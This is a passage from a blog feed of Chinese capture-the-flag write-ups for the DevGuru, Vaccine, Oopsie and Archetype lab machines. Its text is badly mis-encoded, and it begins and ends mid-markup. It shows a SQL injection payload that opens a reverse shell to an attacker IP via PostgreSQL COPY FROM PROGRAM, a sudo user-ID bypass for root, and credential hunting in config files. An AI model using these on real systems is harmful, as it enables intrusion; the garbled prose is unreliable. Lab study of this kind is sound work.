alt="image-20240718223713078"></p><p>çœ‹æ¥æ˜¯ç½‘ç«™çš„æºä»£ç </p><p><img src="/img/OSCP-devguru/image-20240718223759453.png" alt="image-20240718223759453"></p><p>æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶</p><p><img src="/img/OSCP-devguru/image-20240718224102475.png" alt="image-20240718224102475"></p><p>è¿™é‡Œè®°å½•äº†æ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="/img/OSCP-devguru/image-20240718224144444.png" alt="image-20240718224144444"></p><p>4ã€Adminerç™»é™†</p><p><img src="/img/OSCP-devguru/image-20240718224931376.png" alt="image-20240718224931376"></p><p>çœ‹æ•°æ®åº“çš„ç”¨æˆ·ä¿¡æ¯</p><p><img src="/img/OSCP-devguru/image-20240718225450025.png" alt="image-20240718225450025"></p><p>ç”¨john å¯¹è¿™ä¸ªå¯†ç è¿›è¡Œç ´è§£</p><p><img src="/img/OSCP-devguru/image-20240718231547556.png" alt="image-20240718231547556"></p><p>çˆ†ç ´æ—¶é—´å¤ªé•¿äº†ï¼Œæ„Ÿè§‰æ²¡ç»“æœï¼Œä¸è¿‡çœ‹åˆ°æ˜¯bcrypt åŠ å¯†æ–¹æ³•ï¼Œæ˜¯å¦å¯ä»¥æ›´æ–°å¯†ç å‘¢</p><p>5ã€ç™»é™†åå°</p><p>å¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡Œæ›´æ”¹</p><p><img src="/img/OSCP-devguru/image-20240718231900908.png" alt="image-20240718231900908"></p><p>æ›´æ”¹å¯†ç </p><p><img src="/img/OSCP-devguru/image-20240718232004534.png" alt="image-20240718232004534"></p><p>æ‰¾åˆ°åå°è¿›è¡Œç™»é™†</p><p><img src="/img/OSCP-devguru/image-20240718232043073.png" alt="image-20240718232043073"></p><p>è¿›å…¥åå°</p><p><img src="/img/OSCP-devguru/image-20240718232127776.png" alt="image-20240718232127776"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>1ã€æŸ¥æ‰¾ä¿¡æ¯</p><p><img src="/img/OSCP-devguru/image-20240718232855445.png" alt="image-20240718232855445"></p><p>è¿™ä¸ªåœ°æ–¹çœ‹æ¥å¯ä»¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ç”¨é‚£ç§è¯­è¨€ï¼›çœ‹å…¶ä»–çš„åœ°æ–¹ï¼Œè¿™é‡Œæœ‰ä¸ªæ¨¡æ¿å¯ç”¨</p><p><img src="/img/OSCP-devguru/image-20240718232830942.png" alt="image-20240718232830942"></p><p>ä½¿ç”¨ï¼Œå†™å…¥webshellï¼Œä¸Šé¢è¿›è¡Œä¿å­˜</p><p><img src="/img/OSCP-devguru/image-20240718233315302.png" alt="image-20240718233315302"></p><p>å°è¯•æ‰§è¡Œå‘½ä»¤ï¼›æ‰§è¡ŒæˆåŠŸ</p><p><img src="/img/OSCP-devguru/image-20240718233410162.png" alt="image-20240718233410162"></p><p>è¿›è¡Œshellåå¼¹</p><p><img src="/img/OSCP-devguru/image-20240719004234288.png" alt="image-20240719004234288"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ææƒè‡³frank"><a href="#1ã€ææƒè‡³frank" class="headerlink" title="1ã€ææƒè‡³frank"></a>1ã€ææƒè‡³frank</h3><p>1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶</p><p><img src="/img/OSCP-devguru/image-20240719005210553.png" alt="image-20240719005210553"></p><p>ä¼¼ä¹æ˜¯ä»€ä¹ˆå¤‡ä»½æ–‡ä»¶</p><p>2ã€å°†è¿™å‡ ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p>è¿™ä¸ª<code>app.ini.bak</code>æ–‡ä»¶å¥½åƒæ˜¯æŸä¸ªé…ç½®æ–‡ä»¶ï¼Œä»·å€¼å¯èƒ½æ›´å¤§</p><p><img src="/img/OSCP-devguru/image-20240720133233489.png" alt="image-20240720133233489"></p><p>3ã€æŸ¥çœ‹å†…å®¹</p><p><img src="/img/OSCP-devguru/image-20240720133314456.png" alt="image-20240720133314456"></p><p>é€šè¿‡æµè§ˆï¼Œç¡®å®æ˜¯é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œç­›é€‰ï¼Œçœ‹æœ‰æ— å¯†ç ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.ini.bak | grep -C 10 pass</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡grep å‘½ä»¤ï¼Œç­›é€‰ æœ‰å…³ pass çš„æ¡æ•°ï¼Œå¹¶ä¸Šä¸‹æµ®åŠ¨10è¡Œï¼›å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰mysql æ•°æ®åº“çš„å…¶ä»–è´¦å·å¯†ç </p><p><img src="/img/OSCP-devguru/image-20240720134122583.png" alt="image-20240720134122583"></p><p>ä»¥åŠç–‘ä¼¼æœ‰redis æ•°æ®åº“çš„å­˜åœ¨</p><p><img src="/img/OSCP-devguru/image-20240720134239196.png" alt="image-20240720134239196"></p><p>å»é¶æœºä¸­çœ‹ä¸‹æ˜¯å¦æœ‰redis çš„è¿›ç¨‹</p><p><img src="/img/OSCP-devguru/image-20240720134407879.png" alt="image-20240720134407879"></p><p>æ²¡æœ‰ï¼›ä¸è¿‡æˆ‘ä»¬æ‹¿åˆ°äº†mysql æ•°æ®åº“çš„å…¶ä»–è´¦å·ä¿¡æ¯</p><p>4ã€é‡æ–°ç™»é™†MySQL</p><p>æ³¨æ„ï¼Œä¸‹é¢è¿™ä¸ªæ‰æ˜¯ç”¨æˆ·çš„å¯†ç </p><p><img src="/img/OSCP-devguru/image-20240720134747779.png" alt="image-20240720134747779"></p><p>ç™»é™†è¿›æ¥</p><p><img src="/img/OSCP-devguru/image-20240720134803091.png" alt="image-20240720134803091"></p><p>åœ¨<code>user</code>è¡¨ä¸­çœ‹åˆ°<code>frank</code>ç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="/img/OSCP-devguru/image-20240720134938730.png" alt="image-20240720134938730"></p><p>ä¸è¿‡è¿™ä¸ªå¯†ç å¥‡æ€ªçš„å¾ˆï¼Œä¸çŸ¥é“æ˜¯å“ªç§åŠ å¯†æ–¹æ³•ï¼›åé¢çš„<code>passwd_hash_algo</code>ç»™å‡ºäº†åŠ å¯†æ–¹å¼<code>pbkdf2</code></p><p><img src="/img/OSCP-devguru/image-20240720135645239.png" alt="image-20240720135645239"></p><p>æœ¬æ¥è¿˜æƒ³å°è¯•ç”¨<code>pbkdf2</code>çš„åŠ å¯†æ–¹å¼å¯¹å¯†ç è¿›è¡Œä¿®æ”¹çš„ï¼Œç»“æœä¸€çœ‹ï¼Œè¿™ä¸ªåŠ å¯†æ–¹å¼ä¸ä»…éœ€è¦æœ‰ç›ï¼Œè¿˜éœ€è¦keyï¼Œéº»çƒ¦äº†å¾ˆ</p><p><img src="/img/OSCP-devguru/image-20240720140346345.png" alt="image-20240720140346345"></p><p>åœ¨<code>app.ini.bak</code>ä¸­æåˆ°è¿‡å¯†ç çš„åŠ å¯†æ–¹å¼ï¼Œæœ‰æˆ‘ä»¬ç”¨è¿‡çš„<code>bcrypt</code>åŠ å¯†æ–¹æ³• </p><p><img src="/img/OSCP-devguru/image-20240720140444298.png" alt="image-20240720140444298"></p><p>æˆ‘ä»¬ç›´æ¥æŠŠæ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ä¸€åŒæ”¹æ‰</p><p><img src="/img/OSCP-devguru/image-20240720140721959.png" alt="image-20240720140721959"></p><p>5ã€ç™»é™†åå°</p><p>è¿™é‡Œçš„åå°åœ¨8585ç«¯å£ä¸Šï¼Œæ˜¯ä¸€ä¸ªGitea çš„ç§äººä»“åº“</p><p><img src="/img/OSCP-devguru/image-20240720141148502.png" alt="image-20240720141148502"></p><p>ç›´æ¥ç™»é™†</p><p><img src="/img/OSCP-devguru/image-20240720141207760.png" alt="image-20240720141207760"></p><p>æˆåŠŸç™»é™†åå°</p><p><img src="/img/OSCP-devguru/image-20240720141228082.png" alt="image-20240720141228082"></p><p>6ã€ææƒè‡³frank</p><p><img src="/img/OSCP-devguru/image-20240720141511405.png" alt="image-20240720141511405"></p><p>è¿™é‡Œæ˜¾ç¤ºäº†å½“å‰Gitea çš„ç‰ˆæœ¬å·ï¼›æŸ¥æ‰¾æœ‰æ— è¯¥ç‰ˆæœ¬çš„æ¼æ´</p><p><img src="/img/OSCP-devguru/image-20240720141623044.png" alt="image-20240720141623044"></p><p>å¤åˆ¶è¿‡æ¥åˆ©ç”¨</p><p><img src="/img/OSCP-devguru/image-20240720141836369.png" alt="image-20240720141836369"></p><p>æŠŠä»–çš„å‚æ•°å‡‘é½</p><p><img src="/img/OSCP-devguru/image-20240720142234919.png" alt="image-20240720142234919"></p><p>æ˜‚ã€‚ã€‚ã€‚åˆ©ç”¨å¤±è´¥ï¼›ç®€å•çš„çœ‹ä¸€ä¸‹è¿™ä¸ªpy æ–‡ä»¶ï¼Œè¿™é‡Œçš„payloadå¥½åƒæ˜¯å†™å…¥äº†æŸä¸ªæ–‡ä»¶ä¸­</p><p><img src="/img/OSCP-devguru/image-20240720154234575.png" alt="image-20240720154234575"></p><p>æˆ‘ä»¬å†æ‰§è¡Œä¸€ä¸‹ï¼ˆç¨å¤šç­‰å¾…ä¸€ä¼šå„¿ï¼‰ï¼ŒæˆåŠŸæ‹¿åˆ°äº†shell</p><p><img src="/img/OSCP-devguru/image-20240720154426252.png" alt="image-20240720154426252"></p><h3 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h3><p>çœ‹ä¸‹<code>sudo -l</code></p><p><img src="/img/OSCP-devguru/image-20240720154757070.png" alt="image-20240720154757070"></p><p>è¿™é‡Œ<code>ï¼ˆALL, !rootï¼‰</code> è¡¨ç¤ºæ‰€æœ‰ç”¨æˆ·ç»„çš„ érootç”¨æˆ· å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸èƒ½ä»¥root èº«ä»½å»æ‰§è¡Œè¿™ä¸ªä¸œè¥¿ï¼›å°è¯•ä¸€ä¸‹å…ˆ</p><p><img src="/img/OSCP-devguru/image-20240720155322195.png" alt="image-20240720155322195"></p><p>å½“æˆ‘ä»¬æƒ³ç”¨root èº«ä»½è¿è¡Œè¿™ä¸ªä¸œè¥¿æ˜¯éœ€è¦å¯†ç ï¼ˆè¿™é‡Œéœ€è¦å…ˆè¿›å…¥äº¤äº’å¼shellï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé™·å…¥äº†åƒµå±€ï¼Œçœ‹äº†ä¸‹ä½¬çš„æ–‡ç« è¯´ï¼Œè¿™é‡Œçš„sudo æ˜¯å­˜åœ¨æ¼æ´çš„ï¼›å…·ä½“çš„è§£é‡Šåœ¨ <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version">Linux Privilege Escalation | HackTricks</a></p><p><img src="/img/OSCP-devguru/image-20240720161027048.png" alt="image-20240720161027048"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-devguru/image-20240720161158437.png" alt="image-20240720161158437"></p><p>å­˜åœ¨å¯èƒ½åˆ©ç”¨é£é™©ï¼›æˆ‘ä»¬æ”¹å˜sudo çš„åˆ©ç”¨å§¿åŠ¿</p><p><img src="/img/OSCP-devguru/image-20240720161301814.png" alt="image-20240720161301814"></p><p>æˆåŠŸææƒè‡³root</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Hack The Boxç³»åˆ—ã€‘Vaccine</title>
      <link href="/2024/07/16/Hackthebox-Vaccine/"/>
      <url>/2024/07/16/Hackthebox-Vaccine/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Boxç³»åˆ—â€”Vaccine"><a href="#Hack-The-Boxç³»åˆ—â€”Vaccine" class="headerlink" title="Hack The Boxç³»åˆ—â€”Vaccine"></a>Hack The Boxç³»åˆ—â€”Vaccine</h1><p><img src="/img/Hackthebox-Vaccine/image-20240716150020117.png" alt="image-20240716150020117"></p><h2 id="ä¸€ã€ç«¯å£æ‰«æ"><a href="#ä¸€ã€ç«¯å£æ‰«æ" class="headerlink" title="ä¸€ã€ç«¯å£æ‰«æ"></a>ä¸€ã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿç«¯å£æ‰«æ</p><p><img src="/img/Hackthebox-Vaccine/image-20240716150214399.png" alt="image-20240716150214399"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 10000 10.129.235.167</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Vaccine/image-20240716150556995.png" alt="image-20240716150556995"></p><p>è¿™é‡Œæ²¡æœ‰æ‰«æåˆ°80ç«¯å£ï¼Œå¯èƒ½æ˜¯æ‰«æé€Ÿç‡å¤ªå¿«å¯¼è‡´</p><h2 id="äºŒã€FTPä¿¡æ¯æ”¶é›†"><a href="#äºŒã€FTPä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€FTPä¿¡æ¯æ”¶é›†"></a>äºŒã€FTPä¿¡æ¯æ”¶é›†</h2><p>ä½¿ç”¨ftp è´¦å·ç©ºå¯†ç ç™»é™†æˆåŠŸ</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152229763.png" alt="image-20240716152229763"></p><p>å‘ç°ä¸€ä¸ªå¤‡ä»½çš„zip æ–‡ä»¶ï¼Œä¸‹è½½æŸ¥çœ‹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152311187.png" alt="image-20240716152311187"></p><p>å°è¯•è§£å‹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152409356.png" alt="image-20240716152409356"></p><p>éœ€è¦å¯†ç ï¼›è½¬æ¢hash è¿›è¡Œçˆ†ç ´</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152527566.png" alt="image-20240716152527566"></p><p>æŒ‡å®šå¯†ç è§£å‹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152737621.png" alt="image-20240716152737621"></p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>1ã€é¦–é¡µ</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152805070.png" alt="image-20240716152805070"></p><p>2ã€æ˜¯ä¸€ä¸ªç™»é™†é¡µï¼›çœ‹ä»ftp é‚£é‡Œæ‹¿åˆ°çš„index.phpï¼Œåº”è¯¥æ˜¯è¿™ä¸ªé¡µé¢çš„æºç </p><p><img src="/img/Hackthebox-Vaccine/image-20240716152843397.png" alt="image-20240716152843397"></p><p>3ã€ç™»é™†åå°</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153005727.png" alt="image-20240716153005727"></p><p><img src="/img/Hackthebox-Vaccine/image-20240716153028838.png" alt="image-20240716153028838"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><h3 id="1ã€SQLæ³¨å…¥"><a href="#1ã€SQLæ³¨å…¥" class="headerlink" title="1ã€SQLæ³¨å…¥"></a>1ã€SQLæ³¨å…¥</h3><p>åå°è¿™é‡Œç–‘ä¼¼å­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153430087.png" alt="image-20240716153430087"></p><p>ç”¨sqlmap è·‘ä¸€ä¸‹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716173446559.png" alt="image-20240716173446559"></p><p>å°è¯• <code>--os-shell</code> è·å–æƒé™</p><p><img src="/img/Hackthebox-Vaccine/image-20240716181500045.png" alt="image-20240716181500045"></p><p>æç¤ºæˆ‘å‡ºé”™ï¼Œè·å–ä¸äº†</p><h3 id="2ã€getshell"><a href="#2ã€getshell" class="headerlink" title="2ã€getshell"></a>2ã€getshell</h3><p>ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ï¼ŒPostgreSQL version 11.5æœ‰COPYå‘½ä»¤å¯ä»¥åˆ©ç”¨ï¼Œå°è¯•åœ¨sql æ¼æ´å¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; CREATE TABLE cmd_exec(cmd_output text); --</span><br><span class="line">&#x27;; COPY cmd_exec FROM PROGRAM &#x27;bash -c &quot;bash -i 0&gt; /dev/tcp/10.10.16.76/4444&quot;&#x27;; --</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„cmd_execç±»ä¼¼äºSQL serverçš„xp_cmdshellï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>ç¬¬ä¸€å¥æ˜¯åˆ›å»ºä¸€ä¸ªè¡¨cmd_execï¼Œç”¨æ¥æ¥æ”¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒå¥æ˜¯æ‰§è¡Œä¸€æ®µç³»ç»Ÿå‘½ä»¤æ¥å»ºç«‹åå¼¹shellã€‚</p></blockquote><p>ç»è¿‡å°è¯•ï¼Œè¿™ä¸ªshell æ— å›æ˜¾ï¼Œé‚£å†åšä¸€ä¸ªåå¼¹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716182145562.png" alt="image-20240716182145562"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ææƒè‡³postgres"><a href="#1ã€ææƒè‡³postgres" class="headerlink" title="1ã€ææƒè‡³postgres"></a>1ã€ææƒè‡³postgres</h3><p>1ã€ä¿¡æ¯æ”¶é›†</p><p>åœ¨wwwç›®å½•ä¸‹æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="/img/Hackthebox-Vaccine/image-20240716183150203.png" alt="image-20240716183150203"></p><p>çœ‹æ˜¯å¦æœ‰è¿™ä¸ªæ•°æ®åº“åçš„ç”¨æˆ·</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183348914.png" alt="image-20240716183348914"></p><p>æœç„¶æœ‰ï¼Œå°è¯•sshç™»é™†</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183603564.png" alt="image-20240716183603564"></p><p>æˆåŠŸææƒè‡³postgres</p><h3 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h3><p><img src="/img/Hackthebox-Vaccine/image-20240716183911838.png" alt="image-20240716183911838"></p><p>sudo ä½¿ç”¨vi ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184604359.png" alt="image-20240716184604359"></p><p>æˆåŠŸææƒåˆ°root</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184659521.png" alt="image-20240716184659521"></p>]]></content>
      
      
      <categories>
          
          <category> Hacktheboxç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Hack The Boxç³»åˆ—ã€‘Oopsie</title>
      <link href="/2024/07/16/Hackthebox-Oopsie/"/>
      <url>/2024/07/16/Hackthebox-Oopsie/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Boxç³»åˆ—â€”Oopsie"><a href="#Hack-The-Boxç³»åˆ—â€”Oopsie" class="headerlink" title="Hack The Boxç³»åˆ—â€”Oopsie"></a>Hack The Boxç³»åˆ—â€”Oopsie</h1><p><img src="/img/Hackthebox-Oopsie/image-20240716150033322.png" alt="image-20240716150033322"></p><h2 id="ä¸€ã€ç«¯å£æ‰«æ"><a href="#ä¸€ã€ç«¯å£æ‰«æ" class="headerlink" title="ä¸€ã€ç«¯å£æ‰«æ"></a>ä¸€ã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/Hackthebox-Oopsie/image-20240715172908789.png" alt="image-20240715172908789"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173042498.png" alt="image-20240715173042498"></p><p>3ã€æ¼æ´æ‰«æ</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173553044.png" alt="image-20240715173553044"></p><h2 id="äºŒã€HTTPä¿¡æ¯æ”¶é›†"><a href="#äºŒã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€HTTPä¿¡æ¯æ”¶é›†"></a>äºŒã€HTTPä¿¡æ¯æ”¶é›†</h2><p><img src="/img/Hackthebox-Oopsie/image-20240715173614805.png" alt="image-20240715173614805"></p><p>1ã€httpæºä»£ç æŸ¥çœ‹</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173822857.png" alt="image-20240715173822857"></p><p>2ã€ç™»é™†é¡µ</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173942308.png" alt="image-20240715173942308"></p><h2 id="ä¸‰ã€Getshell"><a href="#ä¸‰ã€Getshell" class="headerlink" title="ä¸‰ã€Getshell"></a>ä¸‰ã€Getshell</h2><h3 id="1ã€è¶Šæƒ"><a href="#1ã€è¶Šæƒ" class="headerlink" title="1ã€è¶Šæƒ"></a>1ã€è¶Šæƒ</h3><p>å°è¯•å¼±å£ä»¤ä¸è¡Œä¹‹åï¼Œé€šè¿‡æ¸¸å®¢èº«ä»½è¿›å…¥ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œæç¤ºéœ€è¦adminæƒé™</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174144073.png" alt="image-20240715174144073"></p><p>å›åˆ°è´¦æˆ·ä¿¡æ¯è¿™å„¿</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174246674.png" alt="image-20240715174246674"></p><p>å¯¹id å·è¿›è¡Œéå†</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174821290.png" alt="image-20240715174821290"></p><p>å‘ç°ç®¡ç†å‘˜å’Œè¶…çº§ç®¡ç†å‘˜</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174942277.png" alt="image-20240715174942277"></p><p>å½“ç„¶æ˜¯ä½¿ç”¨è¶…çº§ç®¡ç†å‘˜çš„æƒé™äº†ï¼›æˆ‘ä»¬éœ€è¦è®°ä½è¶…çº§ç®¡ç†å‘˜çš„IDå·å’Œåå­—ï¼Œä¹‹åä¼ªé€ cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175205817.png" alt="image-20240715175205817"></p><p>æ‹¦æˆªUploads çš„è¯·æ±‚é¡µé¢è¿›è¡Œcookieä¼ªé€ </p><p><img src="/img/Hackthebox-Oopsie/image-20240715175317794.png" alt="image-20240715175317794"></p><p>ä¹‹åæ”¾åŒ…ï¼Œå‡ºæ¥ä¸Šä¼ é¡µé¢</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175338382.png" alt="image-20240715175338382"></p><h3 id="2ã€æ–‡ä»¶ä¸Šä¼ getshell"><a href="#2ã€æ–‡ä»¶ä¸Šä¼ getshell" class="headerlink" title="2ã€æ–‡ä»¶ä¸Šä¼ getshell"></a>2ã€æ–‡ä»¶ä¸Šä¼ getshell</h3><p>æŠŠphpåå¼¹shell çš„æ–‡ä»¶æ‹¿è¿‡æ¥</p><img src="/img/Hackthebox-Oopsie/image-20240715175516377.png" alt="image-20240715175516377" style="zoom:150%;" /><p>æ›´æ”¹æˆè‡ªå·±çš„IPå’Œç«¯å£ï¼Œä¹‹åç”¨nc è¿›è¡Œç›‘å¬</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175602005.png" alt="image-20240715175602005"></p><p>æ³¨æ„ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸­ä¾ç„¶éœ€è¦æŠ“åŒ…æ”¹cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175706601.png" alt="image-20240715175706601"></p><p>æç¤ºä¸Šä¼ æˆåŠŸ</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175734909.png" alt="image-20240715175734909"></p><p>é‚£ä¹ˆæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„åœ¨å“ªå„¿ï¼Œå‡­å€Ÿæ„Ÿè§‰ï¼Œæ€»åœ¨æŸä¸ªupload æˆ– uploads ç›®å½•ä¸‹</p><p><img src="/img/Hackthebox-Oopsie/image-20240715181616228.png" alt="image-20240715181616228"></p><p>æˆåŠŸè·å–shell</p><h2 id="å››ã€æƒé™æå‡"><a href="#å››ã€æƒé™æå‡" class="headerlink" title="å››ã€æƒé™æå‡"></a>å››ã€æƒé™æå‡</h2><h3 id="1ã€ææƒåˆ°robert"><a href="#1ã€ææƒåˆ°robert" class="headerlink" title="1ã€ææƒåˆ°robert"></a>1ã€ææƒåˆ°robert</h3><p>1ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184012118.png" alt="image-20240715184012118"></p><p>å‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="/img/Hackthebox-Oopsie/image-20240715184138033.png" alt="image-20240715184138033"></p><p>ç™»é™†æˆåŠŸï¼›æ²¡æ‰¾åˆ°å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œçªç„¶æƒ³åˆ°ä¼šä¸ä¼šæ•°æ®åº“çš„å¯†ç å°±æ˜¯ç”¨æˆ·çš„å¯†ç </p><p><img src="/img/Hackthebox-Oopsie/image-20240715184958853.png" alt="image-20240715184958853"></p><h3 id="2ã€ææƒåˆ°root"><a href="#2ã€ææƒåˆ°root" class="headerlink" title="2ã€ææƒåˆ°root"></a>2ã€ææƒåˆ°root</h3><p>1ã€æŸ¥æ‰¾suid æ–‡ä»¶</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185258297.png" alt="image-20240715185258297"></p><p>2ã€å°è¯•è¿è¡Œè¿™ä¸ªæ–‡ä»¶</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185433394.png" alt="image-20240715185433394"></p><p>3ã€åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å¯ä»¥è¶ŠæƒæŸ¥çœ‹æ–‡ä»¶</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185525361.png" alt="image-20240715185525361"></p><p>4ã€å¯ä»¥è¶ŠæƒæŸ¥çœ‹<code>/etc/shadow</code>ä¹‹åçˆ†ç ´å¯†ç ç­‰</p>]]></content>
      
      
      <categories>
          
          <category> Hacktheboxç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Hack The Boxç³»åˆ—ã€‘Archetype</title>
      <link href="/2024/07/14/Hackthebox-Archetype/"/>
      <url>/2024/07/14/Hackthebox-Archetype/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Boxç³»åˆ—â€”Archetype"><a href="#Hack-The-Boxç³»åˆ—â€”Archetype" class="headerlink" title="Hack The Boxç³»åˆ—â€”Archetype"></a>Hack The Boxç³»åˆ—â€”Archetype</h1><p><img src="/img/Hackthebox-Archetype/image-20240716150043365.png" alt="image-20240716150043365"></p><h2 id="ä¸€ã€ç«¯å£æ‰«æ"><a href="#ä¸€ã€ç«¯å£æ‰«æ" class="headerlink" title="ä¸€ã€ç«¯å£æ‰«æ"></a>ä¸€ã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/Hackthebox-Archetype/image-20240714174834523.png" alt="image-20240714174834523"></p><p>2ã€æ¼æ´æ¢æµ‹</p><p><img src="/img/Hackthebox-Archetype/image-20240714181223120.png" alt="image-20240714181223120"></p><p>å‘ç° Microsoft Windows çš„ <code>CVE-2008-4250</code>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><h2 id="äºŒã€SMBä¿¡æ¯æ”¶é›†"><a href="#äºŒã€SMBä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€SMBä¿¡æ¯æ”¶é›†"></a>äºŒã€SMBä¿¡æ¯æ”¶é›†</h2><p>ç©ºå¯†ç è¿›è¡ŒSMBç™»é™†</p><p><img src="/img/Hackthebox-Archetype/image-20240714181443949.png" alt="image-20240714181443949"></p><p>è¿›è¡ŒSMBè¿æ¥</p><p><img 